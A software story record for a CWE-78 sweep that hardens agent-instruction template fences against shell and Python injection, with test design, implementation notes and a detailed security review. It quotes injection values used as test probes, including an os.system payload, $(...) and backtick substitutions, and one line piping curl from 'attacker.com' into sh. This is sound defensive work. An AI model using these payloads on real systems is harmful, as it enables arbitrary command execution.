---
story_id: "162-39"
jira_key: ""
epic: ""
workflow: "tdd"
---
# Story 162-39: CWE-78 sweep: nine template fences interpolate agent-assembled data into double-quoted Python source strings

## Story Details
- **ID:** 162-39
- **Jira Key:** (none)
- **Workflow:** tdd
- **Stack Parent:** none
- **Branch:** feat/162-39-cwe78-template-fence-python-injection-sweep
- **PR:** (none yet — recorded when the PR is created)

## SM Assessment

**Spec:** the title is the full spec (162-8 review) — a CWE-78/injection sweep across NINE template fences in `pennyfarthing-dist/` markdown that interpolate agent-assembled data into double-quoted Python source strings. Today an apostrophe in a PR title breaks them; a crafted value injects Python. Apply the defense sm-setup already documents UNIFORMLY: positional argv (pass values as `sys.argv`/`$1` positional params, not string-interpolated into the source) + single-quoted heredoc (`<<'PYEOF'` so the shell doesn't expand/interpolate).

**The nine fences:**
- `agents/sm-finish.md:31,41` — `format_pr_title` with `JIRA_KEY`/`TITLE`
- `skills/pf-standalone/*.md:155` (pf-standalone)
- `workflows/git-cleanup` step-03:157
- FIVE gate fences (`gates/*.md`) interpolating session/context paths

**First:** read the DEFENSE pattern in `agents/sm-setup.md` (the positional-argv + single-quoted-heredoc form) — it is the template to copy. Also read any existing CWE-78/injection test (grep `CWE-78`, `single-quoted`, `positional` in tests) so the new tests match the established assertion shape.

**TEA (RED):** the challenge is these are MARKDOWN template fences, not directly-executed code — so pin them the way the framework already pins template safety. Options (use what matches existing 162-8/CWE tests): a template-scanning test that asserts NONE of the nine fences interpolate agent data into a double-quoted Python string (i.e. each uses the positional-argv + single-quoted-heredoc form); and/or an injection/apostrophe reproduction where a value containing `'`/`"`/`$(...)`/newline is shown to break or inject under the OLD form and be safe under the new. Pin all nine sites. Include a NEGATIVE guard so the scanner can't be satisfied by deleting the fences.

**Constraints (binding):** scoped runs — `cd pennyfarthing/pennyfarthing-dist && uv run pytest src/pf/tests/<cwe/policy/template tests>.py -q`. NEVER full suite. `ruff check`. These are template edits — preserve each fence's actual behavior (the Python still runs and does the same thing, just safely). Match sm-setup's documented form exactly. Coordinate-safe: scoped to these 9 template files.

## TEA Assessment

**Tests Required:** Yes
**Status:** RED — 18 failed, 63 passed

**Test File:** `pennyfarthing/pennyfarthing-dist/src/pf/tests/test_162_39_cwe78_template_fence_sweep.py`
**Commit:** `1a8dac24cbe98308ebffe2aa0c67ef11164a9af1` (signed, G)
**Scoped run:** `cd pennyfarthing/pennyfarthing-dist && uv run pytest src/pf/tests/test_162_39_cwe78_template_fence_sweep.py -q`
`ruff check` + `ruff format`: clean.

### The nine fences, resolved against the tree

The story's line refs were stale. Three of the nine were already remediated by
164-6 (their `format_pr_title` Python fences became the `pf git format-title`
CLI). Re-scanning finds EIGHT still-live offenders — the SM's `sm-finish.md:41`
pointed at the already-fixed site and missed two others in the same file.

**Eight live offenders (Dev must fix):**

| # | File | Line | Vulnerable form |
|---|------|------|-----------------|
| 1 | `agents/sm-finish.md` | 29 | `get_repo_config('{REPOS}')` |
| 2 | `agents/sm-finish.md` | 96 | `Path('.session/{STORY_ID}-session.md')` → `write_impact_summary_to_session` |
| 3 | `agents/sm-finish.md` | 120 | `Path('.session/{STORY_ID}-session.md'), story_id='{STORY_ID}'` → `suggest_followups` |
| 4 | `gates/ac-completion.md` | 28 | `validate_ac_completion('${CONTEXT_FILE}', '${SESSION_FILE}')` |
| 5 | `gates/spec-check.md` | 31 | `validate_spec_alignment('${SESSION_FILE}', '${CONTEXT_FILE}')` |
| 6 | `gates/spec-drift-precheck.md` | 30 | `run_spec_drift_precheck('${SESSION_FILE}', '${CONTEXT_FILE}')` |
| 7 | `gates/deviations-logged.md` | 28 | `validate_deviations('${SESSION_FILE}', '${AGENT}')` |
| 8 | `gates/spec-reconcile-pass.md` | 27 | `validate_spec_reconcile('${SESSION_FILE}')` |

**Three already safe (pinned as regression guards — do not touch):**
`agents/sm-finish.md:38`, `commands/pf-standalone.md:150`,
`workflows/git-cleanup/steps/step-03-execute.md:152` — all `pf git format-title`.

Not offenders (verified, leave alone): `workflows/scenario-builder/steps-{code,open}/step-06-validate.md`
pipe agent-assembled YAML through `<<'SCENARIOEOF'` into `yaml.safe_load(sys.stdin)` —
a data channel, already safe by this contract.

### Safe-form contract Dev must apply

Copy `agents/sm-setup.md` Step 5 exactly. Three properties, all required:

1. **Single-quoted heredoc** `<<'PYEOF'` — shell performs no expansion on the payload.
2. **Positional argv** — values ride as DOUBLE-QUOTED words after a bare `-`, read via `sys.argv[N]`.
3. **Zero interpolation in the payload** — no `${VAR}`, `$VAR`, `$(...)`, backticks, `{PLACEHOLDER}`.

```bash
PF_PY="$(sed -n '1s/^#!//p' "$(command -v pf)")"
"${PF_PY:?PF_PY not set - could not resolve the pf launcher interpreter}" - "${SESSION_FILE}" "${CONTEXT_FILE}" <<'PYEOF'
import json, sys
from pf.gates.ac_completion import validate_ac_completion
result = validate_ac_completion(sys.argv[1], sys.argv[2])
print(json.dumps(result))
sys.exit(0 if result['status'] == 'pass' else 1)
PYEOF
```

Keep the fail-loud `${PF_PY:?...}` guard (162-8) and each fence's local PF_PY
derivation. Behavior must be identical — same callable, same args, same exit code.

### Test names

- `TestSweepIntegrity` — `test_sweep_finds_python_payloads`, `test_sweep_locates_every_pinned_payload[8]` (PASS; anti-vacuity)
- `TestNoInterpolationIntoPythonSource` — **all 18 RED failures live here**
  - `test_no_template_interpolates_data_into_python_source` (discovery sweep)
  - `test_no_python_payload_is_shell_expanded`
  - `test_pinned_site_uses_positional_argv_form[8]`
  - `test_pinned_site_passes_values_as_quoted_positional_words[8]`
- `TestFencesStillExist` — negative guard, 11+8+8 params (PASS): file exists, callable still referenced, fence still pf-executing with the PF_PY guard, inputs still parameterized
- `TestVulnerableFormIsExploitable` — reproductions (PASS): apostrophe SyntaxError, Python-literal escape, newline corruption, `$(...)`/backtick command substitution via the placeholder channel
- `TestSafeFormIsInert` — `test_positional_argv_form_passes_value_through_verbatim[7]` (PASS): all 7 hostile values arrive verbatim, rc 0, no marker
- `TestDocumentedDefenseIsIntact` — `test_reference_fence_satisfies_every_check_this_suite_imposes` (PASS): reachability proof

### Exact failing output (primary sweep)

```
AssertionError: template fences splice interpolated data into Python source (8 sites).
Every value must ride as a positional argv word and be read via sys.argv[N], with the
payload in a single-quoted <<'PYEOF' heredoc (see agents/sm-setup.md Step 5):
  agents/sm-finish.md [-c/double]: from pf.git.repos import get_repo_config  tokens=['{REPOS}']
  agents/sm-finish.md [-c/double]: from pathlib import Path  tokens=['{STORY_ID}']
  agents/sm-finish.md [-c/double]: from pathlib import Path  tokens=['{STORY_ID}', '{STORY_ID}']
  gates/ac-completion.md [-c/double]: from pf.gates.ac_completion import validate_ac_completion  tokens=['${CONTEXT_FILE}', '${SESSION_FILE}']
  gates/deviations-logged.md [-c/double]: from pf.gates.deviations import validate_deviations  tokens=['${SESSION_FILE}', '${AGENT}']
  gates/spec-check.md [-c/double]: from pf.gates.spec_check import validate_spec_alignment  tokens=['${SESSION_FILE}', '${CONTEXT_FILE}']
  gates/spec-drift-precheck.md [-c/double]: from pf.gates.spec_drift_precheck import run_spec_drift_precheck  tokens=['${SESSION_FILE}', '${CONTEXT_FILE}']
  gates/spec-reconcile-pass.md [-c/double]: from pf.gates.spec_reconcile import validate_spec_reconcile  tokens=['${SESSION_FILE}']
```

**Handoff:** To Dev for implementation (GREEN).

## Dev Assessment

**Implementation Complete:** Yes
**Status:** GREEN — 133 passed, 0 failed (was 18 failed / 63 passed at RED)

**AC Coverage:**
- AC-1 (no template fence interpolates agent-assembled data into Python source) — DONE. `test_no_template_interpolates_data_into_python_source` and `test_no_python_payload_is_shell_expanded` both sweep clean tree-wide.
- AC-2 (all eight live offenders converted to the sm-setup positional-argv + single-quoted-heredoc form) — DONE. `test_pinned_site_uses_positional_argv_form[8]` and `test_pinned_site_passes_values_as_quoted_positional_words[8]` green.
- AC-3 (behavior preserved — same callables, same args, same exit codes; fences not deleted) — DONE. `TestFencesStillExist` (27 params) green; `${PF_PY:?…}` guard and per-fence PF_PY derivation retained everywhere; the four shapes smoke-tested under `bash` with a hostile value (`Keith's $(printf pwned) file`) arriving verbatim with no marker written.
- AC-4 (the three already-safe `pf git format-title` sites untouched) — DONE. No edits to `commands/pf-standalone.md` or `workflows/git-cleanup/steps/step-03-execute.md`; `sm-finish.md:38` unchanged.

**Files Changed:**
- `pennyfarthing-dist/agents/sm-finish.md` — 3 fences: `get_repo_config`, `write_impact_summary_to_session`, `suggest_followups`
- `pennyfarthing-dist/gates/ac-completion.md` — `validate_ac_completion`
- `pennyfarthing-dist/gates/spec-check.md` — `validate_spec_alignment`
- `pennyfarthing-dist/gates/spec-drift-precheck.md` — `run_spec_drift_precheck`
- `pennyfarthing-dist/gates/deviations-logged.md` — `validate_deviations`
- `pennyfarthing-dist/gates/spec-reconcile-pass.md` — `validate_spec_reconcile`
- `pennyfarthing-dist/agents/sm-setup.md` — Step 0 `is_jira_enabled` payload moved to `<<'PYEOF'` (delivery form only; see deviation)
- `pennyfarthing-dist/workflows/scenario-builder/steps-code/step-06-validate.md` — `-c "…"` → `-c '…'` (delivery form only)
- `pennyfarthing-dist/workflows/scenario-builder/steps-open/step-06-validate.md` — same

**Tests:** 133/133 passing across `test_162_39_cwe78_template_fence_sweep.py` (81), `test_162_8_template_pf_py_policy.py`, `test_162_38_pf_py_policy_hardening.py` — the two PF_PY sweeps still recognize every rewritten fence as pf-executing and guarded.
**Lint:** `ruff check` clean.
**pf validate:** `agent` 38 passed / 0 errors. `schema` reports 150 errors both WITH and WITHOUT these changes (verified via `git stash`) — pre-existing, unrelated to this story.
**Branch:** feat/162-39-cwe78-template-fence-python-injection-sweep (pushed)

**Handoff:** To Reviewer (review phase).

## Reviewer Assessment

**Verdict:** APPROVED

**Injection closed — reproduced independently under real `bash`/`python3`:**

| Fence shape | Hostile value | Result |
|---|---|---|
| `gates/ac-completion.md` (`${CONTEXT_FILE}`, `${SESSION_FILE}`) | `x'; import os; os.system("touch PWNED") #` and `ctx"$(touch PWNED2)\`touch PWNED3\`` | arrived VERBATIM in `sys.argv[1..2]`, rc 0, no marker files |
| `agents/sm-finish.md` `suggest_followups` | same, as both path and `story_id` | verbatim, rc 0, no PWNED |
| `agents/sm-finish.md` `get_repo_config` | `orc'"$(touch PWNED4)\`touch PWNED5\`` | verbatim, rc 0, no markers |
| OLD form (control) | `x'), __import__('os').system('touch PWNED_PY'), Path('y` | **arbitrary code EXECUTED** — vuln confirmed real, fix confirmed load-bearing |

**Behavior preserved (verified, not assumed):**
- Same callable, same arg order, same exit-code expression at all 8 sites; only the transport changed.
- The two riskiest syntactic shapes — `VAR=$("$PF_PY" - "arg" <<'PYEOF' … PYEOF\n)` (sm-finish:29) and `VAR=$("$PF_PY" <<'PYEOF' … PYEOF\n)` with no bare `-` (sm-setup Step 0) — executed and captured correctly under real bash.
- **stdin channel preserved:** `scenario-builder` step-06 correctly kept `-c` (single-quoted) rather than moving to a heredoc, leaving stdin free for `SCENARIOEOF` → `yaml.safe_load(sys.stdin)`. Its payload contains no apostrophes, so `-c '…'` is sufficient. Moving it to a heredoc would have broken it — Dev got this right.
- `${PF_PY:?…}` fail-loud guard and the per-fence `PF_PY=$(sed -n …)` derivation retained on all 11.

**Safe-form contract holds on all 11:** single-quoted `<<'PYEOF'` (or single-quoted `-c` for the two stdin-bearing scenario-builder fences), values as double-quoted positional words after a bare `-`, zero interpolation tokens inside any payload. `test_no_python_payload_is_shell_expanded` + `test_no_template_interpolates_data_into_python_source` sweep the whole dist tree clean.

**Anti-vacuity proven empirically:** I planted a probe file `gates/zz-reviewer-probe.md` containing (a) the old `-c "…${SESSION_FILE}…"` form and (b) an unquoted `<<PYEOF` heredoc. Both made the tree-wide sweep FAIL with no edit to the test file. Probe removed; tree clean. The `TestFencesStillExist` negative guard (27 params) anchors on file existence + callable name + still-pf-executing-with-guard + parameterized inputs, so deleting a fence cannot satisfy the sweep.

**Scoped run:** `133 passed` across `test_162_39_cwe78_template_fence_sweep.py`, `test_162_8_template_pf_py_policy.py`, `test_162_38_pf_py_policy_hardening.py` — the two PF_PY sweeps still recognize every rewritten fence as pf-executing and guarded. `ruff check` clean.

**Deviation audit:**
- *11 fences changed, not 8* — **ACCEPTED.** Same vuln class (shell-expanded delivery of a Python payload), demanded by TEA's own tree-wide sweep, and correctly fixed with the right form per site (heredoc where the payload has apostrophes; single-quoted `-c` where stdin must stay free). Scope growth was forced by the test contract, not discretionary.
- *No positional args on sm-setup Step 0* — **ACCEPTED.** `is_jira_enabled()` takes no inputs; properties 1 and 3 hold, property 2 is vacuous. Verified the capture shape works without a bare `-`.
- *Fence count 8 not 9 / discovery sweep / scenario-builder YAML exclusion* (TEA) — **ACCEPTED.** The YAML-on-stdin exclusion is correct: that body is data into `yaml.safe_load`, not source text.

**Ruling on pinning the 3 extra sites:** NOT a blocking gap; **Low**, recommended as hygiene. Detection is already covered — the tree-wide `test_no_python_payload_is_shell_expanded` catches a regression at any of the three (empirically proven with the probe above), and it is *strictly stronger* than a named pin because it also catches brand-new files. `PINNED_SITES` adds diagnostic locality (a named failing test id per file), not coverage. Adding them is a two-line test edit worth doing, but it does not gate this merge.

**Findings:**

| Severity | Issue | Location | Action |
|---|---|---|---|
| [MEDIUM] | [SEC] **Residual shell-word injection at the `{PLACEHOLDER}` sites.** For `${VAR}` sites (all 5 gates) the value is expanded by the shell and is fully safe. But at the 3 `sm-finish.md` sites the agent writes the literal value *into* a double-quoted shell word, so `$(…)`, backticks and `"` still act at the SHELL layer before python ever runs. Demonstrated: a rendered `- ".session/162-x$(touch PWNED_SHELL)-session.md"` executed the substitution. NOT a regression — the old form had this *plus* Python injection — and attacker control is low (story IDs / repo names). The architecturally correct fix is the 164-6 precedent: give these three a `pf` CLI subcommand so no value crosses a shell boundary. | `agents/sm-finish.md:29,98,123` | Follow-up story (non-blocking) |
| [LOW] | The scanner deliberately does not inspect the positional argv *words* for interpolation tokens (they must be interpolated), so the MEDIUM's class is invisible to CI. A complementary axis — "placeholder-derived argv words must not reach a shell word" — has no test. | `src/pf/tests/test_162_39_cwe78_template_fence_sweep.py:339` | Follow-up (non-blocking) |
| [LOW] | `TEMPLATE_PLACEHOLDER_RE = \{[A-Z][A-Z0-9_]*\}` is upper-case only. A lowercase placeholder (`{story_id}`) would slip the discovery sweep. Justified today (avoids dict/f-string false positives, and dist convention is UPPER), but it is a named assumption worth a comment. | same file:112 | Nit |
| [LOW] | The 3 newly-converted sites (`sm-setup.md` Step 0, both `scenario-builder/steps-{code,open}/step-06-validate.md`) are tree-sweep-only, not in `PINNED_SITES`. | same file:241 | Hygiene, per ruling above |
| [LOW] | [TYPE] No test cross-checks positional argv word count against the highest `sys.argv[N]` index in the payload — a fence could pass 1 word and read `sys.argv[2]`, passing every assertion and `IndexError`-ing at gate execution. All 8 sites verified correct today (counts and order). | same file:413 | Follow-up (non-blocking) |
| [LOW] | `test_pinned_site_passes_values_as_quoted_positional_words` uses `args.split()`, so a legitimately quoted word containing a space would false-fail. Errs safe (rejects, never accepts), so harmless today. | same file:428 | Nit |
| [LOW] | [TEST] `DASH_C_PAYLOAD_RE` truncates a `-c` payload at an escaped `\"`, blinding the interpolation axis (probe D: caught by the `shell_expanded` axis only, `1 failed` instead of `2`). Not exploitable — the second axis rejects all double-quoted `-c` — but the sweep is one axis thinner than it looks for that shape. | same file:99 | Follow-up (non-blocking) |
| [LOW] | [TEST] Sweep domain is limited to fences that textually import pf (`_executes_pf`, inherited from `test_162_8_template_pf_py_policy.py:248`). A payload reaching pf via `__import__`/`importlib` would fall outside the policy. Pre-existing scope boundary, not introduced here; worth a comment so the boundary is deliberate rather than accidental. | same file:87 | Note (non-blocking) |
| [LOW] | [COMMENT] No STALE prose anywhere (verified), but none of the 8 fixed fences carry the CWE-78 rationale comment that `sm-setup.md` Step 5 has. These are LLM-instruction documents — without it, a future agent editing a gate reads the heredoc as style, not as a security contract, and may "simplify" it back to `-c "…"`. | `gates/*.md`, `agents/sm-finish.md` | Follow-up (non-blocking) |
| [LOW] | [RULE] `_run_fence` is missing its return type annotation (`-> tuple[CompletedProcess, str \| None, bool]`); every other function in the module is fully annotated. | same file:586 | Nit |
| — | **Verified good:** the two byte-identical `scenario-builder` step-06 files were both fixed (no half-fix), and the prose comment above each fence was updated to explain *why* `-c` is single-quoted — documentation tracks the change rather than going stale. | | — |

## Subagent Results

| # | Specialist | Received | Status | Findings | Decision |
|---|---|---|---|---|---|
| 1 | reviewer-preflight | Yes | clean | none | N/A — 133/133 green, tree clean, both commits GPG-signed, ruff format PASS, no debug/TODO artifacts |
| 2 | reviewer-security | Yes | findings | 1 (injection, conf. low) | **CONFIRMED, raised to MEDIUM** — independently reproduced my `{PLACEHOLDER}`→shell-word residual; non-blocking |
| 3 | reviewer-test-analyzer | Yes | findings | 6 | 1 CONFIRMED as LOW, 2 **DISMISSED on my own evidence** (claims overstated), 3 accepted as LOW/nits |
| 4 | reviewer-type-design | Yes | findings | 5 | 1 CONFIRMED (LOW, argv-index vs word-count), 4 DISMISSED as unreachable-in-practice style nits |
| 5 | reviewer-rule-checker | Yes | findings | 1 of 22 instances | CONFIRMED as nit — missing return annotation on `_run_fence`; all repo-topology rules clean |
| 6 | reviewer-comment-analyzer | Yes | findings | 2 | CONFIRMED as LOW — no STALE prose anywhere, but the 8 fixed fences lack the CWE-78 rationale comment sm-setup Step 5 carries |
| 7 | reviewer-simplifier | Yes | findings | 3 | DISMISSED as intentional defence-in-depth (see below); the duplicate-file note echoes Dev's own finding |

**All received: Yes** — 7 of 7 spawned specialists returned results; every row above is accounted for with an explicit decision. Two further specialists were considered and deliberately not spawned, with reasons: `reviewer-edge-hunter` (the diff contains no branching logic to enumerate — boundary analysis is subsumed by the 7-value hostile-input matrix in `TestSafeFormIsInert`, which I re-ran myself) and `reviewer-silent-failure-hunter` (no error handling changed — exit-code propagation `sys.exit(0 if … else 1)` is preserved verbatim at all 5 gates, hand-verified line-by-line in the diff).

### Subagent findings — confirmed / dismissed

- **[SEC]** (`reviewer-security`) — swept all 11 sites. **CONFIRMED, and it independently reproduced my MEDIUM:** the 5 gates are fully safe because `"${VAR}"` expansion is never re-parsed by bash; sm-setup and both scenario-builder fences are clean; the 3 `sm-finish.md` sites retain the placeholder→shell-word channel (`{STORY_ID}` = `$(curl attacker.com|sh)` executes at the shell). It rated confidence `low`; I raise it to MEDIUM because I reproduced execution (`PWNED_SHELL` written), but agree it is not blocking — no attacker-controlled path to a sprint story ID or repo name, and it is strictly better than the pre-fix state. Its suggested cheap mitigation is worth capturing in the follow-up: assign first (`STORY_ID="{STORY_ID}"`) then pass `"${STORY_ID}"`, which converts the site to the provably-inert gate shape. No other injection channel found — no unquoted heredoc delimiters, no unquoted argv words, `${PF_PY:?…}` guard intact at every site.
- **[RULE]** (`reviewer-rule-checker`) — 6 rules, 22 instances, **1 violation. CONFIRMED but trivial:** `_run_fence` (test file:586) has annotated params but no return annotation (returns `tuple[CompletedProcess, str | None, bool]`). Nit. All 10 edits land in `pennyfarthing-dist/` (rules 1 and 5 clean — no symlink edits), runtime snippets use `.session/`-relative paths and shell vars with zero hardcoded `pennyfarthing-dist/` (rule 8 clean), and all 5 gate snippets consume the `{success|status, …}` result shape rather than throwing (rule 6 clean).
- **[TEST]** — verified by my own probes rather than taken on faith. **Not vacuous.** I planted three additional probe fences beyond the two above — `python3 -c "…"` (no PF_PY at all), `uv run python -c "…"`, and unquoted `$PF_PY -c "…"` — and the discovery sweep failed on **every** one (`2 failed, 79 passed` each time). Detection is interpreter-agnostic, so it does not depend on the fence looking exactly like today's PF_PY idiom. `HEREDOC_RE` correctly treats a double-quoted delimiter (`<<"PYEOF"`) as inert too, which matches real bash semantics. The `TestSafeFormIsInert` reproduction is **real, not mocked** — `_run_fence` shells out to `bash` with 7 hostile values and asserts on `PWNED_MARKER` file existence plus verbatim round-trip. `TestSweepIntegrity` (extraction >= 8 + per-site extraction pin) and `TestDocumentedDefenseIsIntact::test_reference_fence_satisfies_every_check_this_suite_imposes` (reachability — proves the rules are satisfiable, and caught a real regex bug where `POSITIONAL_ARGV_RE` matched the guard's own `- could not resolve` diagnostic) are the right anti-vacuity scaffolding. `PINNED_SITES` = 11 (8 vulnerable + 3 `pf git format-title` regression guards); the 3 newly-converted sites are tree-sweep-only per my ruling above.
- **[TEST] follow-up — two claimed scanner BYPASSES investigated, both downgraded on evidence.** The analyzer reported these at `medium` confidence; I probed both rather than accept them, and this is the one place my verdict turns on independent work:
  - *Claim: `DASH_C_PAYLOAD_RE` truncates at an escaped `\"`, hiding the interpolation token.* **Real but NOT a bypass.** Probe D (a payload with `\"${SESSION_FILE}\"`) produced `1 failed, 80 passed` — the interpolation sweep was indeed blinded by truncation, but `test_no_python_payload_is_shell_expanded` caught it anyway, because that axis rejects *any* double-quoted `-c` regardless of payload content. This is exactly the defence-in-depth the two independent axes exist to provide. **LOW.**
  - *Claim: `_looks_like_python` is blind to call-only payloads, so a vulnerable fence escapes both sweeps.* Probe E (`-c "print(validate_spec_alignment('${SESSION_FILE}'))"`) did pass all 81 tests — but I traced the cause and the analyzer's diagnosis is **wrong**. I patched `_looks_like_python` as suggested and the probe still passed. Direct instrumentation shows the real gate is `_executes_pf(fence) == False`: the sweep's domain is fences that textually import pf (`from pf.x`, `-m pf.x`), a documented scoping choice **inherited from the shared 162-8 helper** (`test_162_8_template_pf_py_policy.py:248`), not something this story introduced. And probe E is not a realistic fence — it calls an unimported name and would `NameError` immediately. Any fence that actually does useful pf work must import pf, and is therefore swept. **Downgraded to LOW (documented scope boundary), not a defect in this change.**
- **[SIMPLIFY]** (`reviewer-simplifier`) — 3 findings, **all DISMISSED.** It argues the per-site `PINNED_SITES` assertions duplicate the tree-wide sweeps. They do overlap by construction, and that overlap is the point: the sweep tells you *a* violation exists, the named per-site test tells you *which file* and refuses to let a partial fix hide behind an aggregate. Probe D above is the concrete payoff — the "redundant" second axis was the only thing that caught it. Removing either axis would have weakened the guard. Its third finding (duplicate scenario-builder files) restates Dev's own Delivery Finding and is correctly scoped as a follow-up; it also usefully corrects the record — the two files are ~98% identical, not byte-identical.
- **[TYPE]** (`reviewer-type-design`) — 5 findings. **One worth keeping, four dismissed as nits:**
  - **CONFIRMED [LOW]:** no test cross-checks positional word count against the highest `sys.argv[N]` index in the payload. A fence could pass one word but read `sys.argv[2]` and satisfy every current assertion while raising `IndexError` at gate execution. I hand-verified all 8 sites are correct today (counts 2/2/2/2/1/1/1/2 and, critically, **arg ORDER preserved** — `ac-completion` is still `(CONTEXT, SESSION)`, `spec-check`/`spec-drift` still `(SESSION, CONTEXT)`, `deviations` still `(SESSION, AGENT)`, `suggest_followups` still `(path, story_id)`), so this is a missing guard, not a live bug. Cheap fix: `re.findall(r"sys\.argv\[(\d+)\]", payload.text)` and assert `max(...) <= len(args)`.
  - **DISMISSED:** `quoting`/`kind` as `str` instead of `Literal` — `quoting` is assigned from a closed set at exactly two construction sites (test file:190, 200) and the `"double"` sentinel is correct in both branches, so there is no reachable path to a silent mis-classification. A `Literal` alias is nicer; it is not a hole. Likewise `vulnerable_at_red: bool` (filtered once at :313) and the unnamed `_run_fence` 3-tuple — style, in a test module, with the invariants visible on one screen.

**Data flow traced:** a hostile PR/story value → agent substitutes into a double-quoted shell word → shell passes it as one `argv` element (no re-expansion of the variable's *contents*) → `sys.argv[N]` → `Path(...)`/`story_id=` as opaque data → `json.dumps` on stdout. Safe at the Python layer end-to-end; the one remaining hazard is upstream of the shell word, captured as the MEDIUM.

**Handoff:** To SM for finish-story.

## Workflow Tracking
**Workflow:** tdd
**Phase:** finish
**Phase Started:** 2026-08-12T13:57:44Z

### Phase History
| Phase | Started | Ended | Duration |
|-------|---------|-------|----------|
| setup | 2026-08-12T13:22:12Z | 2026-08-12T13:23:37Z | 1m 25s |
| red | 2026-08-12T13:23:37Z | 2026-08-12T13:33:49Z | 10m 12s |
| green | 2026-08-12T13:33:49Z | 2026-08-12T13:40:14Z | 6m 25s |
| review | 2026-08-12T13:40:14Z | 2026-08-12T13:57:44Z | 17m 30s |
| finish | 2026-08-12T13:57:44Z | - | - |

## Delivery Findings

Agents record upstream observations discovered during their phase.
Each finding is one list item. Use "No upstream findings" if none.

**Types:** Gap, Conflict, Question, Improvement
**Urgency:** blocking, non-blocking

<!-- Agents: append findings below this line. Do not edit other agents' entries. -->

### TEA (test design)
- **Gap** (non-blocking): the story's fence inventory was three sites stale — `pf-standalone:155` and `git-cleanup` step-03:157 no longer contain Python fences (164-6 replaced them with `pf git format-title`), and `sm-finish.md:41` is that same already-applied fix. Meanwhile two real offenders in `sm-finish.md` (:96 `write_impact_summary_to_session`, :120 `suggest_followups`) were not in the list. Affects the 162-8 review's finding format (line-anchored inventories go stale between sprints; anchor on callable/shape instead). *Found by TEA during test design.*
- **Improvement** (non-blocking): `test_162_8_template_pf_py_policy.py` sweeps for the WRONG INTERPRETER but has no notion of payload construction, which is why the injection shape survived its sweep. This story's scanner is the complementary axis. Affects `pennyfarthing-dist/src/pf/tests/` (consider merging both sweeps into one template-safety policy module once green). *Found by TEA during test design.*

### Dev (implementation)
- **Gap** (non-blocking): TEA's offender inventory (8 sites) and TEA's own tree-wide sweep disagreed — `test_no_python_payload_is_shell_expanded` also rejects three payloads with NO interpolation tokens (`agents/sm-setup.md` Step 0, `workflows/scenario-builder/steps-{code,open}/step-06-validate.md`). Notably `sm-setup.md` is the story's own REFERENCE file, and `scenario-builder` step-06 was explicitly excluded by TEA's deviation — the exclusion holds for the YAML data channel but not for the file's separate `-c "…"` Python payload. Affects `pennyfarthing-dist/src/pf/tests/test_162_39_cwe78_template_fence_sweep.py` (pin these three in `PINNED_SITES` so the inventory matches the sweep). *Found by Dev during implementation.*
- **Improvement** (non-blocking): the two `scenario-builder` step-06 files are byte-identical in their validator fence and prose, and were fixed by the same edit twice. Affects `pennyfarthing-dist/workflows/scenario-builder/steps-{code,open}/step-06-validate.md` (extract the shared validator block, or generate one from the other). *Found by Dev during implementation.*

### Reviewer (code review)
- **Gap** (non-blocking): the fix closes Python-source injection but the three `sm-finish.md` sites still cross a SHELL word boundary — the agent writes a `{PLACEHOLDER}` literal into a double-quoted word, so `$(…)`/backticks/`"` in a story ID or repo name still act at the shell layer (reproduced: `- ".session/162-x$(touch PWNED_SHELL)-session.md"` executed). Affects `pennyfarthing-dist/agents/sm-finish.md` (apply the 164-6 precedent — promote these three fences to `pf` CLI subcommands so no agent-assembled value crosses a shell boundary). Same latent shape exists in the untouched pre-existing `case "{JIRA_KEY}" in` at `agents/sm-setup.md:117`. *Found by Reviewer during code review.*
- **Improvement** (non-blocking): the CWE-78 rationale comment exists only in `agents/sm-setup.md` Step 5, not at the 8 fixed sites. Affects `pennyfarthing-dist/gates/*.md` and `pennyfarthing-dist/agents/sm-finish.md` (copy the Step 5 rationale block above each fence — these are agent-instruction docs, so an undocumented security contract invites a future agent to "simplify" the heredoc back to `-c "…"`). *Found by Reviewer during code review.*
- **Improvement** (non-blocking): the template-safety policy is now split across three test modules (162-8 wrong-interpreter, 162-38 guard hardening, 162-39 payload construction) that share private helpers via cross-module import (`from pf.tests.test_162_8_template_pf_py_policy import _executes_pf, …`). Test modules importing each other's underscore-private helpers is fragile. Affects `pennyfarthing-dist/src/pf/tests/` (promote the shared scanner into a real module, e.g. `pf/tests/support/template_policy.py`, and merge the three sweeps — this is TEA's own earlier finding, now with a third consumer). *Found by Reviewer during code review.*
- **Improvement** (non-blocking): the scanner has no axis for "placeholder-derived value reaches a shell word", which is why the above is invisible to CI. Affects `pennyfarthing-dist/src/pf/tests/test_162_39_cwe78_template_fence_sweep.py` (add a third check alongside `interpolations` and `shell_expanded`; also pin the three tree-sweep-only sites in `PINNED_SITES`). *Found by Reviewer during code review.*

## Design Deviations

Agents log spec deviations as they happen — not after the fact.
Each entry: what was changed, what the spec said, and why.

<!-- Agents: append deviations below this line. Do not edit other agents' entries. -->

### TEA (test design)
- **Fence count is 8, not 9:** spec said nine vulnerable fences at named lines; tests pin eight live offenders plus three already-safe sites (11 total). Reason: 164-6 already remediated three of the nine via `pf git format-title`, and the SM's list missed two real `sm-finish.md` offenders. Verified by grepping every `-c "` / heredoc payload in the dist tree.
- **Discovery sweep, not a pure per-file pin:** spec suggested scanning the nine sites; tests do BOTH — a `PINNED_SITES` enumeration (named, so a partial fix is visible per-file) layered on a tree-wide discovery sweep. Reason: matches the established 162-8 policy-sweep shape, so a new template with the vulnerable form fails CI with no edit to the test file.
- **`scenario-builder` step-06 excluded:** it interpolates agent-assembled YAML, but through `<<'SCENARIOEOF'` into `yaml.safe_load(sys.stdin)` — a data channel, not Python source. Reason: already safe under this story's contract; sweeping it would demand a needless change. Encoded in `_looks_like_python()`.

### Dev (implementation)
- **11 fences changed, not 8:**
  - **Spec source:** SM story + TEA Assessment ("Eight live offenders (Dev must fix)").
  - **Spec text:** convert the eight enumerated fences to the positional-argv + single-quoted-heredoc form.
  - **Implementation:** the eight, plus three delivery-form-only conversions demanded by TEA's tree-wide `test_no_python_payload_is_shell_expanded` sweep: `agents/sm-setup.md` Step 0 (`is_jira_enabled`, `-c "…"` → `<<'PYEOF'`), and `workflows/scenario-builder/steps-{code,open}/step-06-validate.md` (`-c "…"` → `-c '…'`).
  - **Rationale:** those three carry ZERO interpolation tokens (not injectable today) but are delivered by a shell-EXPANDED quoting form, which the sweep rejects on its own axis. The scenario-builder payload contains no apostrophes, so single-quoting `-c` is sufficient and keeps the `SCENARIOEOF` stdin channel free; sm-setup's payload does contain apostrophes, so it moved to a heredoc (no positional args — it takes no inputs).
  - **Severity:** minor.
  - **Forward impact:** none — same callables, same args, same exit codes; behavior identical.
- **No positional args on the sm-setup Step 0 fence:**
